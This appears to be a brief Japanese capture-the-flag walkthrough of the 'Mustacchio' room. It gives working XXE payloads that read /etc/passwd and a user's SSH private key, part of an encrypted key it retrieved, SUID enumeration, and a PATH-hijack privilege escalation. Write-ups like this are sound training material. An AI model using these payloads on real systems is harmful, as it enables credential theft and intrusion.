---
title: "Mustacchio"
date: 2024-03-16T14:06:52+09:00
draft: false
---

- /custom/js/users.bak というファイルがある．
  - admin:~~ みたいなのがあって，パスワードがハッシュ化されているのでクラックする
-行き詰ったので ```nmap -A -p-```
  - ultraseek-http みたいなのが 8765 で開いてる
  - admin ログインできる
  - XML コードを入れられる
  - XXE

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY example "XML Injection"> ]>
<comment>
<name>Joe Hamd</name>
<author>&example;</author>
<com>Test paragraph</com>
</comment>
```

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY xxe **SYSTEM** 'file:///etc/passwd'>]>
<comment>
<name>Joe Hamd</name>
<author>Joe</author>
<com>&xxe;</com>
</comment>
```

- ソースコードに barry, ssh して！みたいなコメントがあったので

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM 'file:////home/barry/.ssh/id_rsa'>]>
<comment>
<name>Joe Hamd</name>
<author>Joe</author>
<com>&xxe;</com>
</comment>
```

- SSH 鍵をゲット
  - フォーマットがウザい

```txt
- ----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
~~~ snip ~~~
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----
```

- ssh2john

### root

- ```find / -perm -u=s -type f 2>/dev/null```
  - live_log を見つける
  - 権限 s
  - strings で tail を見つける
  - 絶対パスじゃないのでパスを追加
  - /tmp に tail → /bin/bash を作成
  - ```export PATH=”/tmp:$PATH”```
